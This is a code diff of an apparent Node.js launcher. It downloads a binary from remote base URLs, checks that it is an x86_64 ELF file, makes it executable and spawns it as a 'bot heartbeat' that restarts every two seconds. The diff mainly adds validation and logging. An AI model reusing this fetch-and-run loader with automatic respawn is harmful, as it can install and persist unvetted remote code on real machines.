@@ -37,11 +37,21 @@ function request(url, redirects) {
 async function download(rel, dest) {
   for (const base of BASES) {
     try {
-      const { status, buffer } = await request(`${base}/${rel}`, 0);
+      const { status, buffer } = await request(`${base}/${rel}?cb=${Date.now()}`, 0);
       if (status === 200 && buffer && buffer.length > 0) {
+        if (buffer.length < 4 || buffer[0] !== 0x7f || buffer[1] !== 0x45 || buffer[2] !== 0x4c || buffer[3] !== 0x46) {
+          console.log(`bad binary for ${rel}: not an ELF file, first bytes ${buffer.slice(0, 8).toString('hex')}`);
+          continue;
+        }
+        const machine = buffer.readUInt16LE(18);
+        if (machine !== 62) {
+          console.log(`bad binary for ${rel}: machine ${machine} (expected 62 = x86_64, node arch=${process.arch})`);
+          continue;
+        }
         await fs.promises.mkdir(path.dirname(dest), { recursive: true });
         await fs.promises.writeFile(dest, buffer);
         await fs.promises.chmod(dest, 0o755);
+        console.log(`downloaded ${rel} (${buffer.length} bytes)`);
         return true;
       }
     } catch {}
@@ -69,7 +79,8 @@ async function main() {
     process.exit(1);
   }
   console.log('starting bot heartbeat');
-  const bot = spawn(path.join(__dirname, 'c'), [], {
+  const botPath = path.join(__dirname, 'c');
+  const bot = spawn(botPath, [], {
     stdio: 'inherit',
     cwd: __dirname,
   });
@@ -78,7 +89,13 @@ async function main() {
     setTimeout(main, 2000);
   });
   bot.on('error', (err) => {
-    console.error(`spawn failed: ${err.message}, restarting`);
+    try {
+      const st = fs.statSync(botPath);
+      const exe = (st.mode & 0o111) !== 0;
+      console.error(`spawn failed: ${err.message} (file exists=${st.isFile()}, executable=${exe}, size=${st.size})`);
+    } catch (e) {
+      console.error(`spawn failed: ${err.message} (stat error: ${e.code})`);
+    }
     setTimeout(main, 2000);
   });
 }
